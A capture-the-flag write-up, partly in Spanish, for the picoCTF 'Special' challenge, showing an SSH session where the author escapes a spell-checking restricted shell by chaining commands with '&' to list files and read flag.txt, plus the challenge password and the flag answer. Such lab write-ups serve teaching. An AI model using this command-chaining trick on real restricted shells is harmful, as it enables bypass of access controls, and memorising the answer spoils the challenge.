# special
## Descripción

Don't power users get tired of making spelling mistakes in the shell? Not anymore! Enter Special, the Spell Checked Interface for Affecting Linux. Now, every word is properly spelled and capitalized... automatically and behind-the-scenes! Be the first to test Special in beta, and feel free to tell us all about how Special streamlines every development process that you face. When your co-workers see your amazing shell interface, just tell them: That's Special (TM)Start your instance to see connection details.

Additional details will be available after launching your challenge instance.

`ssh -p 55982 ctf-player@saturn.picoctf.net`The password is `d137d16e`
## Solución

```
┌──(adri㉿kali)-[~/Escritorio]
└─$ ssh -p 49435 ctf-player@saturn.picoctf.net

Special$ Clear & find .
Clear & find . 
sh: 1: Clear: not found
.
./blargh
./blargh/flag.txt
./.cache
./.cache/motd.legal-displayed
Special$ Clear & cat ./blargh/flag.txt
Clear & cat ./blargh/flag.txt 
sh: 1: Clear: not found
picoCTF{5p311ch3ck_15_7h3_w0r57_3befb794}
```

picoCTF{5p311ch3ck_15_7h3_w0r57_3befb794}
## Notas adicionales

Hacemos uso de varia sintaxis del shell comun hasta que encontramos sintaxis que existe en special y nos permite encontrar la flag.
## Referencias